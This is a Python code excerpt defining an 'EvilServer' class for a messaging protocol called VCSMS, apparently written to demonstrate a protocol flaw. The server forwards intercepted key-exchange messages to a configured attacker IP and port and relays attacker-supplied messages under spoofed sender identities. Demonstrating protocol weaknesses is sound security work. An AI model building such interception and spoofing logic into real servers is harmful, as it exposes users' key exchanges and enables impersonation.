...
class EvilServer:
    """An evil VCSMS messaging server. Provides (flawed) messaging capabilities to clients."""
    def __init__(self, addr: str, port: int, keypair: tuple[tuple[int, int], tuple[int, int]], db_path: str, pubkey_directory: str, logger: Logger, attacker_ip: str, attacker_port: int, attacker_id: str):
        """Initialise an evil VCSMS server.
        ...
        while client.connected():
            if client.new():
                ...
                if recipient == "0":
                    ...
                    if message_type == "NewMessage" and client_id != self.attacker_id and recipient != self.attacker_id:
                        message_index, dh_pub, dh_sig = message_values

                        print(f"NewMessage to {recipient} from {client_id} intercepted")
                        attacker = NonStreamSocket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
                        attacker.connect(self.attacker_ip, self.attacker_port)
                        attacker.send(recipient.encode('utf-8'))
                        attacker.send(self._message_parser.construct_message(client_id, "NewMessage", message_index, dh_pub, dh_sig))
                        attacker.close()
                    elif message_type == "MessageData" and client_id == self.attacker_id:
                        message_index, aes_iv, ciphertext = message_values
                        ciphertext = bytes.fromhex(ciphertext.decode('utf-8'))
                        spoofed_sender = ciphertext[:64].decode('utf-8')
                        ciphertext = ciphertext[64:].hex().encode('utf-8')
                        print(f"Spoofing message from {spoofed_sender} to {recipient}")
                        spoofed = self._message_parser.construct_message(spoofed_sender, message_type, message_index, aes_iv, ciphertext)
                        self.send(recipient, spoofed)
                    else:
